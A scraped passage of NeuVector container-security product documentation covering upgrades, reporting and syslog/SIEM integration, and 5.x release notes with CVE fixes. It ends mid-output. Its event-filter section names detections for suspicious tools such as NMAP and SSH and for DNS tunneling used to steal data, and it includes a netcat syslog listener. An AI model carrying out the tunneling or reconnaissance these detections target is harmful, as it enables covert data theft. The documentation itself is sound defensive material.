3.2.3+.License to enable serverless security requiredNew clusterolebinding and clusterrole added for Kubernetes an OpenShiftController no longer has built in scanner. You must deploy at least 1 scanner pod.Yaml file changes in main deployment samples: Added deployment for scanner pods (2 default)Scanner pod deployment has commented out section for local scanning casesAdded cron job for updater pod for cve database updates of scanners  Upgrading from 3.x to 4.0​  For Helm deployments, update the helm chart to the new version 1.6.0. Then a standard upgrade to 4.0.0 is all that is required (e.g. helm upgrade my-release --set imagePullSecrets=regsecret-neuvector,tag=4.0.0 ./neuvector-helm/).  tip Kubernetes (for OpenShift use the equivalent oc commands)  Backup the configuration from Settings -&gt; ConfigurationCreate the two new bindings kubectl create clusterrolebinding neuvector-binding-view --clusterrole=view --serviceaccount=neuvector:defaultkubectl create rolebinding neuvector-admin --clusterrole=admin --serviceaccount=neuvector:default -n neuvector Set the version tags to 4.0.0 for the Controller, Manager, Enforcer yaml's and apply the updateCreate the scanner podsCreate or update the scanner cron jobWait a few minutes for the rolling update of the controllers to complete, and check all settings after login... ","version":"5.2","tagName":"h3"},{"title":"Reporting & Notifications","type":0,"sectionRef":"#","url":"/5.2/reporting/reporting","content":"","keywords":"","version":"5.2"},{"title":"Reporting​","type":1,"pageTitle":"Reporting & Notifications","url":"/5.2/reporting/reporting#reporting","content":" Reports can be viewed and downloaded from several menus in the NeuVector console. The Dashboard displays a security summary which can be downloaded as a pdf. The pdf download can be filtered for a namespace if desired.    Vulnerability scanning and CIS benchmark results for registries, containers, nodes and platforms can also be downloaded as CSV files from their respective menus in the Assets menu sections.  The Security Risks menu provides advanced correlation, filtering and reporting for vulnerabilities and compliance checks. Filtered views can be exported in CSV or PDF formats.    Compliance reports for PCI, HIPAA, GDPR and other regulations can be filtered, viewed and exported by selecting the regulation in the advanced filter popup in Security Risks -&gt; Compliance.    Event Reporting​  All events such as security, admin, admission, scanning, and risk are logged by NeuVector and can be also viewed in the Console in the Notifications menu. See below for details.  Event Limits  All events are stored in memory for display in the Dashboard and Notifications screens. It is expected that events are sent via SYSLOG, webhook or other means to be stored and managed by a SIEM system. There is currently a 4K limit on each event type below:  Risk Reports (scanning, found in Notifications -&gt; Risk Reports)General Events (administration, found in the Notifications -&gt; Events)Violations (network violations, found in Notifications -&gt; Security Events)Threats (network attacks and connection issues, found in Notifications -&gt; Security Events)Incidents (process and file violations, found in Notifications -&gt; Security Events)  This is why once the limit is reached, only the most recent 4K events of that type are shown. This affects the Notifications lists are well as the displays in the Dashboard.  ","version":"5.2","tagName":"h3"},{"title":"SIEM and SYSLOG​","type":1,"pageTitle":"Reporting & Notifications","url":"/5.2/reporting/reporting#siem-and-syslog","content":" You can configure the SYSLOG server and webhook notifications in the NeuVector console in the Settings -&gt; Configuration menu. Choose the logging level, TCP or UDP, and format if json is desired. CVE data can be sent individually for each CVE and/or include layered scan results. You can also choose to send events to the controller's pod log instead of or in addition to syslog. Note that events are only sent to the lead controller's pod log.  You can then use your favorite reporting tools to monitor NeuVector events.  In addition, you can configure your syslog server through the CLI as follows:  &gt; set system syslog_server &lt;ip&gt;[:port]   The REST API can also be used for configuration.  Sample SYSLOG Output​  Network Violation  2020-01-24T21:39:34Z neuvector-controller-pod-575f94dccf-rccmt /usr/local/bin/controller 12 neuvector - notification=violation,level=Warning,reported_timestamp=1579901965,reported_at=2020-01-24T21:39:25Z,cluster_name=cluster.local,client_id=edf1c28d3411a9686e6e0374a9325b6a3626619938d3cf435a9d90075a1ef653,client_name=k8s_POD_node-pod-7c57bdbf5d-dxkn4_default_cdd9cf23-488d-439c-9408-ed98f838c67b_0,client_domain=default,client_image=k8s.gcr.io/pause:3.1,client_service=node-pod.default,server_id=external,server_name=external,server_port=80,ip_proto=6,applications=[HTTP],servers=[],sessions=1,policy_action=violate,policy_id=0,client_ip=192.168.35.69,server_ip=172.217.5.110   Process Violation  2020-01-24T21:39:29Z neuvector-controller-pod-575f94dccf-rccmt /usr/local/bin/controller 12 neuvector - notification=incident,name=Process.Profile.Violation,level=Warning,reported_timestamp=1579901965,reported_at=2020-01-24T21:39:25Z,cluster_name=cluster.local,host_id=k43:HF45:AJC6:5RYO:O5OA:KACD:KRT2:M3O6:P3VQ:IC4I:FSRD:P3HJ:ETLS,host_name=k43,enforcer_id=90822bad25eea14180c0942bf30197528bdab8c8237f307cc3059e6bbdb91f7a,enforcer_name=k8s_neuvector-enforcer-pod_neuvector-enforcer-pod-cg8jp_neuvector_d4ef187e-041c-4bc2-9cdc-c563a3feac6c_0,workload_id=d1be6d14f1f2782029d0944040ea8c0ba581991de99df86041205e15abc80209,workload_name=k8s_node-pod_node-pod-7c57bdbf5d-dxkn4_default_cdd9cf23-488d-439c-9408-ed98f838c67b_0,workload_domain=default,workload_image=nvbeta/node:latest,workload_service=node-pod.default,proc_name=curl,proc_path=/usr/bin/curl,proc_cmd=curl google.com,proc_effective_uid=1000,proc_effective_user=neuvector,client_ip=,server_ip=,client_port=0,server_port=0,server_conn_port=0,ether_type=0,ip_proto=0,conn_ingress=false,proc_parent_name=docker-runc,proc_parent_path=/usr/bin/docker-runc,action=violate,group=nv.node-pod.default,aggregation_from=1579901965,count=1,message=Process profile violation   Admission Control  2020-01-24T21:48:31Z neuvector-controller-pod-575f94dccf-rccmt /usr/local/bin/controller 12 neuvector - notification=audit,name=Admission.Control.Violation,level=Warning,reported_timestamp=1579902506,reported_at=2020-01-24T21:48:26Z,cluster_name=cluster.local,host_id=,host_name=,enforcer_id=,enforcer_name=,workload_domain=default,workload_image=nvbeta/swarm_nginx,base_os=,high_vul_cnt=0,medium_vul_cnt=0,cvedb_version=,message=Creation of Kubernetes ReplicaSet resource (nginx-pod-695cd4b87b) violates Admission Control deny rule id 1000 but is allowed in monitor mode [Notice: the requested image(s) are not scanned: nvbeta/swarm_nginx],user=kubernetes-admin,error=,aggregation_from=1579902506,count=1,platform=,platform_version=   To capture SYSLOG output:  nc -l -p 8514 -o syslog-dump.hex | tee syslog-messages.txt   Captures messages on screen, logs them to file and logs a hexdump.  Integration with Splunk​  You can integrate with Splunk using SYSLOG to capture container security events and report in Splunk.  ","version":"5.2","tagName":"h3"},{"title":"Notifications and Logs​","type":1,"pageTitle":"Reporting & Notifications","url":"/5.2/reporting/reporting#notifications-and-logs","content":" In the NeuVector Console in the Notifications menu you can find notifications for Security Events, Risk (Scanning &amp; Compliance) Events, and general system events.  Notifications can be downloaded as CSV or PDF from the Notifications menus. In addition, packet captures can be downloaded for network attacks, and vulnerability results can be downloaded from the Notifications -&gt; Risk reports menu for each scan result.  You can also display the logs using the CLI or REST API.  Security Events​  Violations are connections that violate the whitelist Rules or match a blacklist Rule. Network violations are captured and source IPs can be investigated further. Whitelist network violation events show up as &quot;Implicit Deny Rule is Violated&quot; to indicate the network connection did not match any whitelist rule.    In this view, you can review network, process, and file events and easily add a whitelist rule for false positives by clicking the Review Rule button. The Advanced Filter enables you to select the type of event to display.    NeuVector also continuously monitors all containers for know attacks such as DNS, DDoS, HTTP-smuggling, tunneling etc. When an attack is detected it is logged here and blocked (if container/service is set to protect), and the packet is automatically captured. You can view the packet details, for example:    Add New Rules for Security Events  You can easily add rules (Security Policy) to allow or deny the detected event by selecting the Review Rule button and deploying a new rule.    This is useful if false positives occur or a network/process behavior should have been discovered but did not occur during the Discover mode.  Advanced Filters  Create an advanced filter for viewing or exporting events by selecting each general type or entering keywords.  Network. Network events such as violations (implicit deny rules), threats.Process. Process whitelist violations or suspicious processes detected such as NMAP, SSH etc.Package. A package has been updated or installed in the container therefore this generated a security event.Tunnel. A tunnel violation has been detected. Tunneling, typically dns tunneling is used to steal data. This detection is done by seeing a tunnel process start and correlating it with a network activity with dns protocol. See sample event below. Description of iodine tunnel https://github.com/yarrick/iodineFile. File access violation. Either a monitored sensitive file/directory has been accessed (see list of default monitoring, or a custom file monitor rule has been triggered. https://docs.neuvector.com/policy/filerulesPrivilege. A privilege escalation has been detected in container or host. Privilege escalations can be done in many ways and are not 100% detectable so this is a difficult condition to test.  Risk Reports​  This section contains events for vulnerability scans (image, registry, run-time, container, host, platform), compliance scans (CIS benchmarks, custom scripts), and admission control events (allowed, denied).  ","version":"5.2","tagName":"h3"},{"title":"Other Integrations​","type":1,"pageTitle":"Reporting & Notifications","url":"/5.2/reporting/reporting#other-integrations","content":" NeuVector has published a Prometheus exporter with Grafana dashboard on the NeuVector github account https://github.com/neuvector/prometheus-exporter which can be customized for each installation. In addition, sample integrations with Fluentd are also available upon request.  Webhook alerts can be sent by configuring the web hook endpoint in Settings -&gt; Configuration. Then create the appropriate response rule(s) in the Policy -&gt; Response rules menu to select the type of event and the webhook as the action. ","version":"5.2","tagName":"h3"},{"title":"5.x Release Notes","type":0,"sectionRef":"#","url":"/5.2/releasenotes/5x","content":"","keywords":"","version":"5.2"},{"title":"Release Notes for 5.x​","type":1,"pageTitle":"5.x Release Notes","url":"/5.2/releasenotes/5x#release-notes-for-5x","content":" note To receive email notifications of new releases, please subscribe to this SUSE mailing list: https://lists.suse.com/mailman/listinfo/neuvector-updates  5.2.4-s2 February 2024​  Remediates following CVEs:High cve: CVE-2023-52425 in expat, CVE-2024-20952 and CVE-2024-20918 in openjdk11Med cve: CVE-2023-52426 in expat, CVE-2024-20926, CVE-2024-20921, CVE-2024-20945 and CVE-2024-20919 in openjdk11, CVE-2024-0727 and CVE-2023-6237 in openssl  5.2.4-s1 January 2024​  Security Patch Release​  Remediates CVE-2023-6129 in openssl, and CVE-2023-46219, CVE-2023-46218 in curl.  5.2.4 November 2023​  Bug Fixes​  Azure AKS ValidatingWebhookConfiguration changes and error logging.  5.2.3 November 2023​  Enhancements​  Add support for NVD API 2.0 in Scanner.Scan the container host in scanner standalone mode.  docker run --rm --privileged --pid=host neuvector/scanner -n   Bug Fixes​  Scan on a node fails due to deadlocked docker cp / grpc issue.  5.2.2-s1 October 2023​  Security Update​  Update packages to remediate CVEs including High CVE-2023-38545 and CVE-2023-43804.  5.2.2 October 2023​  Security Advisory for CVE-2023-32188​  Remediate CVE-2023-32188 “JWT token compromise can allow malicious actions including Remote Code Execution (RCE)” by auto-generating certificate used for signing JWT token upon deployment and upgrade, and auto-generating Manager/RESTful API certificate during Helm based deployments. Certificate for JWT-signing is created automatically by controller with validity of 90days and rotated automatically.Auto-generation of Manager, REST API, and registry adapter certificate requires using Helm-based install using NeuVector helm version 2.6.3 or later.Built-in certificate is still used for yaml based deployments if not replaced during deployment; however, it is recommended to replace these (see next line).Manual replacement of certificate is still supported and recommended for previous releases or yaml based deployments. See the NeuVector GitHub security advisory here for a description.Use of user-supplied certificates is still supported as before for both Helm and yaml based deployments. Add additional controls on custom compliance scripts. By default, custom script are now not allowed to be added, unless the environment variable CUSTOM_CHECK_CONTROL is added to Controller and Enforcer. Values are &quot;disable&quot; (default, not allowed), &quot;strict&quot; (admin role only), or &quot;loose&quot; (admin, compliance, and runtime-policy roles).Prevent LDAP injection - username field is escaped.  Enhancements​  Add additional scan data to CVE results sent by SYSLOG for layered scansSupport NVD API 2.0 for scan CVE databaseProvide container image build date in Assets -&gt; Container detailsAdjust sorting for Network rules: disable sorting in Network rules view but enable sorting of network rules in Group view.Enable/disable TLS 1.0 and TLS 1.1 detection/alerting with environment variables to Enforcer THRT_SSL_TLS_1DOT0, THRT_SSL_TLS_1DOT1. Disabled by default.Add environment variable AUTO_PROFILE_COLLECT for Controller and Enforcer to assist in capturing memory usage when investigating memory pressure events. Set value = 1 to enable.Configuration assessments against Admission Control should show all violations with one scan.Add more options for CVE report criteria in Response Rules. Example 1 - &quot;cve-high-with-fix:X&quot; means: When # of (high vulnerability that have been fixed) &gt;= X, trigger the response rule. Example 2 - &quot;cve-high-with-fix:X/Y&quot; means: When # of (high vulnerability that were reported Y days ago &amp; have been fixed) &gt;= X, trigger the response rule.  Bug Fixes​  Export of group policy does not return any actual YAML contentsImprove pruning of namespaces with dedicated functionNeuVector namespace user cannot see assets--&gt;namespacesSkip handling the CRD CREATE/UPDATE requests if the CR's namespace is already deletedProvide workaround for part of CRD groups which cannot be pruned successfully after namespaces are deleted.  5.2.1 August 2023​  Enhancements​  Report layered scan results and additional CVE data in SYSLOG messages. This is enabled through a checkbox in Settings -&gt; Configuration -&gt; SYSLOGExport NIST 800-53 mappings (to docker CIS benchmarks) in the exported csv compliance reportSupport Proxy setting in image signature verificationInclude image signature scan result in the downloaded CVE reportSupport pod annotations for Admission Control Policies, available through the Custom criteriaAdd Last Modified field to filter for vulnerabilities report printing, as well as Advanced Filter in Vulnerabilities view  Bug fixes​  Do not create default admin with default password in initial NeuVector deployment for AWS billing (CSP adapter) offering, requiring user to use a secret to create admin username and passwordFix .json file which increased size and crashed a kubernetes nodeImprove SQL injection detection logicWhen installing the helm crd chart first before installing the NeuVector core chart, service accounts are missingImage scan I.4.1 compliance result is incorrectVulnerability advanced filter report showing images from all other namespace  5.2.0 July 2023​  Enhancements​  Support tokens for NeuVector API access. See Settings -&gt; User, API Keys... to create a new API key. Keys can be set to default or custom roles.Support AWS Marketplace PAYG billing for NeuVector monthly support subscriptions. Users can subscribe to NeuVector by SUSE support, billed monthly to their AWS account based on previous month's average node count usage. Details here.Support image signing for admission controls. Users can require NeuVector to verify that images are signed by specific parties before they can be deployed into the production environment, through an integration with Sigstore/Cosign. See Assets -&gt; Sigstore Verifiers for creating new signature assets. Rules can then be created with criteria Image Signing and/or Image Sigstore Verifiers.Enable each admission control rule to have its own mode of Monitor or Protect. A Deny action in Monitor mode will alert, and a Deny action in Protect mode will block. Allow actions are unaffected.Add a new regex operator in Policy &gt; Admission Control &gt; Add Rule for Users and User Groups to support regex. Support operators &quot;matches ANY regex in&quot; and &quot;matches NONE regex in&quot;.Add support for admission control criteria such as resource limits. A new criteria is added for Resource Limits, and additional criteria are supported through the Custom Criteria settings.Support invoking NeuVector scanner from Harbor registries through the pluggable scanner interface. This requires configuration of the connection to the controller (exposed API). The Harbor adapter calls controller endpoint to trigger a scan, which can scan automatically on push. Interrogation services can be used for periodic scans. Scan results from Federation Primary controllers ARE propagated to remote clusters. NOTE: There is an issue with the HTTPS based adapter endpoint error: please ignore Test Connection error, it does work even though an error is shown (skip certificate validation).Searchable SaaS service for CVE lookups. Search the latest NeuVector CVE database to see if a specific CVE exists in the database. This service is available for NeuVector Prime (paid support subscription) customers. Contact support through your SCC portal for access.Allow user to disable network protection but keep WAF/DLP functioning. Configure Network Policy Enablement in Settings -&gt; Configuration.Use less privileged services accounts as required for each NeuVector component. A variable “leastPrivilege” is introduced. The default is false. NOTE: Using the current helm chart with this variable on a release prior to 5.2.0 will not function properly.Bind to non-default service account to meet CIS 1.5 5.1.5 recommendation.Enable administrator to configure user default Session Time out in Settings -&gt; Users, API Keys &amp; Roles.Customizable login banner and customizable UI header text for regulated and government deployments. Requirements for configuration can be found here.SYSLOG support for TLS encrypted transport. Select TCP/TLS in Settings -&gt; Configuration for SYSLOG.Enable deployment of the NeuVector monitor helm chart from Rancher Manager.Remove upper limit for top level domain in URL validator for registry scanning.Scan golang dependencies, including run-time scans.Support Debian 12 (Bookworm) vulnerability scan.Add CSV export for Registry / Details to export CVEs for all images in configured registry in Assets -&gt; Registries for a selected registry.Allow NeuVector to set several ADFS certificates in parallel in x.509 certificate field.Add and display the comment field for Response Rules.Specify what NeuVector considers to be system containers through environment variable. For example, for Rancher and default namespaces: NV_SYSTEM_GROUPS=*cattle-system;defaultAdd support for Kubernetes 1.27 and OpenShift 4.12  Bug Fixes​  Reduce repeating logs in enforcer/controller logs.Multiple clusters page does not render.Empty group auto-removal takes 2 hours to delete instead of 1 hour according to schedule.Manually allowed network rule not getting applied and resulting in violation for pause image.Blocking SSL connections even if a network rule permits the traffic under certain initial conditions.Security events warning even with allowed network rules due to policy update issue in synchronization.Network Activities wrongly associating custom group traffic to external.Default service account token of the namespace mounted in each pod is too highly privileged.Despite defining the network rules, violations getting logged under security events (false positives) when the container has stopped due to out of memory (OOM) error.Allow user to disable/enable detection and protection against unmanaged container in cluster. This can be set through the Manager CLI:  set system detect_unmanaged_wl status -h Usage: cli set system detect_unmanaged_wl status [OPTIONS] {true|false} Enable/disable detect unmanaged container   Other​  Add &quot;leastPrivilege&quot; setting in Helm chart. Add helm option for New_Service_Profile_Baseline. A new Helm chart (core) version is published for 5.2.Enable AWS Marketplace (billing adapter) integration settings in Helm chart.Update configmap to support new features (multiple ADFS certificates, zero drift, New_Service_Profile_Baseline, SYSLOG TLS, user timeout)Update supported Kubernetes versions to 1.19+, and OpenShift 4.6+ (1.19+ with CRI-O)  5.1.3 May 2023​  Enhancements​  Add new vulnerability feed for scanning Microsoft .NET framework.Enforcer stats are disabled by default in Prometheus exporter to improve scalability.Usability improvement: Using scanner to scan single image and print the result (see example below).Add imagePullPolicy check in admission control rules criteria.Show warning message when CRD schema is out of date.  Bug Fixes​  Network Activity screen does not render or incorrectly renders.Empty group auto-removal takes 2 hours to delete instead of 1 hour according to schedule.Compliance profile doesn’t show in UI console.Advanced Filter in Security Events Missing &quot;Error&quot; Level.Saved password with special character fails on future authentication attempt.Multiple clusters page does not render properly when requests are high.Registry detail (bottom) pane not updating.  Scanner Sample Output​  Image: https://registry.hub.docker.comlibrary/alpine:3.4 Base OS: alpine:3.4.6 TOTAL: 6, HIGH: 1, MEDIUM: 5, LOW: 0, UNKNOWN: 0 ┌─────────┬───────────────┬──────────┬───────────┬───────────────┬────────────┐ │ PACKAGE │ VULNERABILITY │ SEVERITY │ VERSION │ FIXED VERSION │ PUBLISHED │ ├─────────┼───────────────┼──────────┼───────────┼───────────────┼────────────┤ │ openssl │ CVE-2018-0732 │ High │ 1.0.2n-r0 │ 1.0.2o-r1 │ 2018-06-12 │ │ ├───────────────┼──────────┤ ├───────────────┼────────────┤ │ │ CVE-2018-0733 │ Medium │ │ 1.0.2o-r0 │ 2018-03-27 │ │ ├───────────────┤ │ ├───────────────┼────────────┤ │ │ CVE-2018-0734 │ │ │ 1.0.2q-r0 │ 2018-10-30 │ │ ├───────────────┤ │ ├───────────────┼────────────┤ │ │ CVE-2018-0737 │ │ │ 1.0.2o-r2 │ 2018-04-16 │ │ ├───────────────┤ │ ├───────────────┼────────────┤ │ │ CVE-2018-0739 │ │ │ 1.0.2o-r0 │ 2018-03-27 │ │ ├───────────────┤ │ ├───────────────┼────────────┤ │ │ CVE-2018-5407 │ │ │ 1.0.2q-r0 │ 2018-11-15 │ └─────────┴───────────────┴──────────┴───────────┴───────────────┴────────────┘   5.1.2 March 2023​  Enhancements​  Support virtual host based address group and policy matching network protections. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.Compliance containers list to exclude exited containers.Enhance DLP rules to support simple wildcard in the pattern.Add support for cri-o 1.26+ and OpenShift 4.11+.Make gravatar optional.Display cluster namespace resource in console / UI.Display source severity/classification (e.g. Red Hat, Ubuntu...) along with NVD severity score in console.Don’t allow SSO/RBAC disabling for Rancher and OpenShift if user is authenticated through SSO.Add auto-scan enablement and deletion of unused groups aging to configMap.Include IP address for external source/destination in csv/pdf for implicit deny violationsVarious performance and scalability optimizations for controller and enforcer CPU and memory usage.  Bug Fixes​  Fix application slowness on GKE Container Optimized OS (COS) nodes when in Protect mode.SUSE Linux (SLES) 15.4 CVE not matching in scanner. With this fix, if the severity is provided in the feed, the vulnerability will be added to the database, even if the NVD record is missing. It is possible that the report includes vulnerabilities without CVE scores.  Other​  Enhance Admission Control CRD options in helm https://github.com/neuvector/neuvector-helm/pull/237.Add new enforcer environment variables to helm chart.  5.1.1 February, 2023​  Enhancements​  Add “package” as information to the syslog-event for a detected vulnerability.Add Enforcer environment variable ENF_NETPOLICY_PULL_INTERVAL - Value in seconds (recommended value 60) to reduce network traffic and resulting resource consumption by Enforcer due to policy updates/recalculations. (Note: this was an undocumented addition until August of 2023).   - name: ENF_NETPOLICY_PULL_INTERVAL value: &quot;60&quot; &lt;== regulate the pulling gap by 60 seconds   Bug Fixes​  Empty group deletion errors &quot;Object not found&quot;Traffic within the same container alerting/blockingUnexpected implicit violations for istio egress traffic with allow rule in placeWhen upgrading from NeuVector 4.x release, incorrect pod group membership causes unexpected policy violationOIDC authentication failed with ADFS when extra encoding characters appear in the requestHigh memory usage by dp creating and deleting podsUpdate alpine to remediate several CVEs including Manager: CVE-2022-37454, CVE-2022-42919, CVE-2022-45061, CVE-2021-46848; Enforcer: CVE-2022-43551, CVE-2022-43552Various UI bugs fixed  Other​  Helm chart updated to enable replacement of certificate for internal communications  5.1.0 December, 2022​  Enhancements​  Centralized, multi-cluster scanning (CVE) database. The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage.Enhance admission control rules: Custom criteria for admission control rules. Allow users to define resource criteria on all pod related fields and to be used in rules, for example item.metadata.annotationsKey contains 'neuvector', item.metadata.name='xyzzy' etc.Add criteria to check for high risk RBAC settings for service accounts when deploying pods. These include criteria 'any action of workload resources', 'any action on RBAC', 'create workload resources', 'listing secrets', and 'exec into a container'.Add semantic version comparison to modules for admission control rules. This enables &gt; or &lt; operators to applied to version numbers in rules (e.g. don't allow module curl&lt;6.2.0 to be deployed). This allows specific version checks on installed packages.Add an admission control rule for Pod Security Admission (PSA) supported in Kubernetes 1.25+. Add new env variable NO_DEFAULT_ADMIN which when enabled does not create an 'admin' user. This is used for Rancher SSO integration as the default. If not enabled, persistently warn the user and record events to change the default admin password if it is not changed from default.Blocking login after failed login attemps now becomes the default. The default value is 5 attempts, and configurable in Settings -&gt; Users &amp; Roles-&gt; Password Profile.Add new env variable for performance tuning ENF_NO_SYSTEM_PROFILES, value: &quot;1&quot;. When enabled, it will disable the process and file monitors. No learning processes, no profile modes, no process/file (package) incidents, and no file activity monitor will be performed. This will reduce CPU/memory resource usage and file operations.Add a custom auto-scaling setting for scanner pods, with value Delayed, Immediate, and Disabled. Important: Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value. Delayed strategy: When lead controller continuously sees &quot;task count&quot; &gt; 0 for &gt; 90 seconds, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Immediate strategy: Every time when lead controller sees &quot;task count&quot; &gt; 0, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Custom groups are now able to use namespace labels, including Rancher's namespace labels. Generally, pod and namespace labels can now be added to Custom Groups.Add ability to hide selected namespaces, groups in Network Activity view.Full support for Cilium cni.Full support of OpenShift 4.9 and 4.10.Build tools are now available for the NeuVector/Open Zero Trust (OZT) project at https://github.com/openzerotrust/openzerotrust.io.NeuVector now lists the version ID and SHA256 digest for each version of the controller, manager, enforcer at https://github.com/neuvector/manifests/tree/main/versions.Anonymous telemetry data (number of nodes, groups, rules) is now reported to a Rancher cloud service upon deployment to assist the project team in understanding usage behavior. This can be disabled (opt-out) in UI or with configMap (No_Telemetry_Report) or REST API.(Addendum January 2023). Support for ServiceEntry based network policy with Istio. Egress network policy enforcement functionality was added in version 5.1.0 for pods to ServiceEntry destinations declared with Istio. Typically, a ServiceEntry defines how an external service referred by DNS name is resolved to a destination IP. Prior to v5.1, NeuVector could not detect and enforce rules for connections to a ServiceEntry, so all connections were classified as External. With 5.1, rules can be enforced for specific ServiceEntry destinations. IMPORTANT: If you are upgrading to v5.1 with an Istio based deployment, new rules must be created to allow these connections and avoid violation alerts. After upgrading, Implicit violations will get reported for newly visible traffic if allow rules don't exist. New traffic rules can be learned and auto-created under Discover mode. To allow this traffic, you can put the group into discover mode or create a custom group with addresses (or DNS name) and new network rule to this destination to allow the traffic. NOTE: There is a bug in 5.1.0 in the destination reported by the deny violations that do not represent the correct destination. The bug reports both server_name and client_name are the same. This issue will get addressed in an upcoming patch release.  Bug Fixes​  Reduce controller memory consumption from unnecessary cis benchmark data created during rolling updates. This issue does not occur on new deployments.Remove license from configuration screen (no longer required).  5.0.6-s1 March, 2023​  Bug Fixes​  Update alpine packages to remediate CVEs in curl including CVE-2023-23914, CVE-2023-23915, and CVE-2023-23916  5.0.6 February, 2023​  Bug Fixes​  High memory usage in dpMsgConnectionHigh memory usage on dp process in enforcer if there are many learned policy rules with unmanaged workload (memory leak)tcpdump is unable to start successfully when sniffering a traffic on containerUpdate alpine to remediate several CVEs including Manager: CVE-2022-37454, CVE-2022-42919, CVE-2022-45061, CVE-2021-46848; Enforcer: CVE-2022-43551, CVE-2022-43552  5.0.5 November, 2022​  Bug Fixes​  Upgrading to 5.0.x results in an error message about Manager, Controller, Enforcer running different versions.Enforcers experiencing go routine panic resulting in dp kill. WebUI does not reflect enforcer as online.Unexpected Process.Profile.Violation incident in NV.Protect group on which command on coreos.  5.0.4 October, 2022​  Security updates​  Update alpine to remove critical CVE-2022-40674 in the manager expat library, as well as other minor CVEs.  Enhancements​  Add support for Antrea CNI  Bug Fixes​  Fix unexpected process.profile.violation incident in the NV.Protect group.When SSL is disabled on manager UI access, user password is printed to the manager log.  5.0.3 September, 2022​  Enhancements​  Do not display the EULA after successful restart from persistent volume.Use the image filter in vulnerability profile setting to skip container scan results.Support scanner in GitHub actions at https://github.com/neuvector/neuvector-image-scan-action.Add Enforcer environment variables for disabling secrets scanning and running CIS benchmarks   env: - name: ENF_NO_SECRET_SCANS (available after v4.4.4) value: &quot;1&quot; - name: ENF_NO_AUTO_BENCHMARK (after v5.0.3) value: &quot;1&quot;   Bug Fixes​  Enforcer unable to start occasionally.Connection leak on multi-cluster federation environments.Compliance page not loading some times in Security Risks -&gt; Compliance  5.0.2 July 2022​  Enhancements​  Rancher hardened and SELinux clusters are supported.  Bug Fixes​  Agent process high cpu usage on k3s systems.AD LDAP groups not working properly after upgrade to 5.0.Enforcer keeps restating due to error=too many open files (rke2/cilium).Support log is unable to download successfully.  5.0.1 June 2022​  Enhancements​  Support vulnerability scan of openSUSE Leap OS (in scanner image).Scanner: implement wipe-out attributes during reconstructing image repo.Verify NeuVector deployment and support for SELinux enabled hosts. See below for details on interim patching until helm chart is updated.Distinguish between Feature Chart and Partner Charts in Rancher UI more prominently.+ Improve ingress annotation for nginx in Rancher helm chart. Add / update ingress.kubernetes.io/protocol: https to nginx.ingress.kubernetes.io/backend-protocol: &quot;HTTPS&quot;.Current OpenShift Operator supports passthrough routes for api and federation services. Additional Helm Value parameters are added to support edge and re-encrypt route termination types.  Bug Fixes​  AKS cluster could add unexpected key in admission control webhook.Enforcer is not becoming operational on k8s 1.24 cluster with 1.64 containerd runtime. Separately, enforcer sometimes fails to start.Any admin-role user(local user or SSO) who promotes a cluster to fed master should be automatically promoted to fedAdmin role.When sso using Rancher default admin into NeuVector on master cluster, the NeuVector login role is admin, not fedAdmin.Fix several goroutine crashes.Implicit violation from host IP not associated with node.ComplianceProfile does not show PCI tag.LDAP group mapping sometimes is not shown.Risk Review and Improvement tool will result in error message &quot;Failed to update system config: Request in wrong format&quot;.OKD 3.11 - Clusterrole error shows even if it exists.  CVE Remediations​  High CVE-2022-29458 cve found on ncurses package in all images.High CVE-2022-27778 and CVE-2022-27782 found on curl package in Updater image.  Details on SELinux Support​  NeuVector does not need any additional setting for SELinux enabled clusters to deploy and function. Tested deploying NeuVector on RHEL 8.5 based SELinux enabled RKE2 hardened cluster. Neuvector deployed successfully if PSP is enabled and patching Manager and Scanner deployment. The next chart release should fix the below issue.  Attached example for enabling psp from Rancher chart and given below the commands for patching Manager and Scanner deployment. The user ID in the patch command can be any number.  kubectl patch deploy -ncattle-neuvector-system neuvector-scanner-pod --patch '{&quot;spec&quot;:{&quot;template&quot;:{&quot;spec&quot;:{&quot;securityContext&quot;:{&quot;runAsUser&quot;: 5400}}}}}' kubectl patch deploy -ncattle-neuvector-system neuvector-manager-pod --patch '{&quot;spec&quot;:{&quot;template&quot;:{&quot;spec&quot;:{&quot;securityContext&quot;:{&quot;runAsUser&quot;: 5400}}}}}'   Example for enabling PSP:  [neuvector@localhost nv]$ getenforce Enforcing [neuvector@localhost nv]$ sestatus SELinux status: enabled SELinuxfs mount: /sys/fs/selinux SELinux root directory: /etc/selinux Loaded policy name: targeted Current mode: enforcing Mode from config file: enforcing Policy MLS status: enabled Policy deny_unknown status: allowed Memory protection checking: actual (secure) Max kernel policy version: 33 [neuvector@localhost nv]$ kk get psp Warning: policy/v1beta1 PodSecurityPolicy is deprecated in v1.21+, unavailable in v1.25+ NAME PRIV CAPS SELINUX RUNASUSER FSGROUP SUPGROUP READONLYROOTFS VOLUMES global-restricted-psp false RunAsAny MustRunAsNonRoot MustRunAs MustRunAs false configMap,emptyDir,projected,secret,downwardAPI,persistentVolumeClaim neuvector-binding-psp true SYS_ADMIN,NET_ADMIN,SYS_PTRACE,IPC_LOCK RunAsAny RunAsAny RunAsAny RunAsAny false * system-unrestricted-psp true * RunAsAny RunAsAny RunAsAny RunAsAny false * [neuvector@localhost nv]$ nvpo.sh NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES neuvector-controller-pod-54f69f7f9c-6h822 1/1 Running 0 5m51s 10.42.0.29 localhost.localdomain &lt;none&gt; &lt;none&gt; neuvector-enforcer-pod-jz77b 1/1 Running 0 5m51s 10.42.0.30 localhost.localdomain &lt;none&gt; &lt;none&gt; neuvector-manager-pod-588488bb78-p6vf9 1/1 Running 0 111s 10.42.0.32 